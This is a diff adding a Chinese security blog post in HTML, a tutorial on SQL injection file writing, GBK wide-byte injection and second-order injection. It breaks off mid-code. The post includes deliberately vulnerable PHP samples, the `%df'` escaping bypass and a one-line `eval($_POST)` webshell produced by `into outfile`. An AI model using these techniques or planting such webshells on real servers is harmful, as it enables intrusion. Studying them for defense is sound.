@@ -1,0 +1,680 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Cayce">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言：  这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。 参考文献：水清云影老师的讲解视频 正文：  SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊。 文件写入：  这是利用SQL语句中i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+<meta property="og:url" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Atlantis">
+<meta property="og:description" content="前言：  这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。 参考文献：水清云影老师的讲解视频 正文：  SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊。 文件写入：  这是利用SQL语句中i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/1.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/2.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/3.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/5.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/6.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/7.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/8.jpg">
+<meta property="og:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/QQ.png">
+<meta property="article:published_time" content="2021-05-09T06:08:38.000Z">
+<meta property="article:modified_time" content="2021-05-09T08:29:16.459Z">
+<meta property="article:author" content="Cayce">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/1.jpg">
+  
+  
+  
+  <title>SQL注入漏洞之文件写入、宽字节注入及二次注入 - Atlantis</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SQL注入漏洞之文件写入、宽字节注入及二次注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-05-09 14:08" pubdate>
+          May 9, 2021 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SQL注入漏洞之文件写入、宽字节注入及二次注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>  这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。</p>
+<p>参考文献：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av48675526/?p=7">水清云影老师的讲解视频</a></p>
+<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>  SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊。</p>
+<h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="文件写入："></a>文件写入：</h3><p>  这是利用SQL语句中<code>into outfile</code>语句进行注入的一种方式，通过漏洞点将木马写入服务器的注入方式。假设站点下存在普通的SQL注入，代码举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">#sql.php<br>&lt;?php<br>$id&#x3D;$_GET[&#39;id&#39;];<br>$conn&#x3D;@mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,NULL,&#39;erci2&#39;);<br>$sql&#x3D;&quot;SELECT * FROM USER WHERE id&#x3D;&#123;$id&#125;&quot;;<br>$result&#x3D;mysqli_query($conn,$sql) or die(mysqli_error($conn));<br>while($row&#x3D;mysqli_fetch_array($result))&#123;<br>  echo &quot;ID:&quot;.$row[&#39;id&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>  echo &quot;username:&quot;.$row[&#39;username&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>  echo &quot;password:&quot;.$row[&#39;password&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>  echo &quot;EMAIL:&quot;.$row[&#39;PHONE&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>&#125;<br>mysqli_close($conn);<br>echo &quot;&lt;hr&gt;&quot;;<br>echo $sql;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>  正常的执行结果是这样的：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/1.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>从源代码中就可以看出来源码存在SQL报错注入，而且是数字型报错注入；没有过滤<code>into outfile</code>关键字，这就是产生SQL注入文件写入的前提，如果这里被人写入这样的语句：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/2.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>  虽然我用的是MAC，当我一直都搞不懂文件目录，不过在Windows可以直接用<code>F:/VHOST/www/con.php</code>就会在那个目录在站点目录下面生成一个php文件，根据我上面的语句，里面生成的内容就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#con.php</span><br><span class="hljs-number">2</span>	Cayce	Atlantis	<span class="hljs-number">18888888888</span><br><span class="hljs-number">1</span>	<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);<span class="hljs-meta">?&gt;</span>	<span class="hljs-number">3</span>	<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+
+<p>  这里会出现一句话木马是因为上面payload里面的16进制内容就是一句话木马。</p>
+<h3 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h3><p>  先来谈谈宽字节的来源吧：一般的网站为了人性化，都会用到字符，字符集和字符序，而程序员在网站开发上处理这些字符的用的大多都是UTF-8编码，也就是位于ASCII码和UNICODE之间的中间编码，但有一些特殊的网站还会用到ASCII编码，而宽字节就是其中几类ASCII编码的特征，比如常见的有：GB2312、GBK、GB18030、BIG5、Shift_JIS等，这些编码都是由两个字节，也就是一个字组成。而款字节注入就是利用这个特性来吃掉被转义的ASCII字符（一个字节），而不影响代码的执行。代码举例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sql.php</span><br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=GBK&quot;</span>);<br><span class="hljs-variable">$id</span>=addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$conn</span>=@mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&#x27;erci2&#x27;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;SET NAMES &#x27;GBK&#x27;&quot;</span>);<br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error(<span class="hljs-variable">$conn</span>));<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ID:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PHONE:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>&#125;<br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>先看一下正常SQL注入：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>再看一下宽字节注入方法：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/3.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>对比发现，正常闭合的单引号被转义了，而使用<code>%df&#39;</code>的方式闭合会出现一个‘運’字，这是因为原本转义单引号的<code>\</code>被吃掉了，组成一个宽字节字符。看这里的一张图</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/5.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>  走一下过程：MYSQL的编码被设置成宽字节型编码，php代码中使用的转义函数对接收的数据进行处理，payload中对闭合符号之前加入吃掉%5c的%df符号，在宽字节的编码下，形成一个被SQL语言忽略的汉字，绕过成功。</p>
+<h3 id="二次注入："><a href="#二次注入：" class="headerlink" title="二次注入："></a>二次注入：</h3><p>  二次注入是因为程序员在编写后台代码的时候虽然精心处理了用户传过来的数据，但存储在数据库之中的数据还是跟用户输入的数据的一样，而数据在取出数据库的时候，就会被当作SQL语句执行，从而造成二次注入。代码举例一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sql.php 注册功能</span><br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;constant-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>	<span class="hljs-variable">$Username</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Username&#x27;</span>]);<br>	<span class="hljs-variable">$Password</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Password&#x27;</span>]);<br>	<span class="hljs-variable">$Phone</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Phone&#x27;</span>]);<br>	<span class="hljs-variable">$conn</span>=@mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&#x27;erci2&#x27;</span>);<br>	<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into user(username,password,phone) values(&#x27;<span class="hljs-subst">&#123;$Username&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$Password&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$Phone&#125;</span>&#x27;)&quot;</span>;<br>	<span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error());<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br>		header(<span class="hljs-string">&#x27;location:1.php&#x27;</span>);<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>	&lt;title&gt;SQL二阶注入&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-left: 35%;&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>	Username:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;Username&quot;</span>&gt;&lt;br /&gt;<br>	Password :&lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;Password&quot;</span>&gt;&lt;br /&gt;<br>	Phone:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;Phone&quot;</span> style=<span class="hljs-string">&quot;margin-left: 3.3%&quot;</span>&gt;&lt;br /&gt;<br>	&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> style=<span class="hljs-string">&quot;margin-left: 20%; color: #00f; background-color: #0af&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>注册之后可以在某一位置对数据进行查询获修改，代码举例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#1.php 查询功能</span><br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;constant-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>	<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>	<span class="hljs-variable">$conn</span>=@mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&#x27;erci2&#x27;</span>);<br>	<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27;&quot;</span>;<br>	<span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error());<br>	<span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>))&#123;<br>		<span class="hljs-variable">$Username</span>=<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>		<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username=&#x27;<span class="hljs-subst">&#123;$Username&#125;</span>&#x27;&quot;</span>;<br>		<span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error());<br>		<span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>))&#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ID:&quot;</span>.<span class="hljs-variable">$row</span>[<span 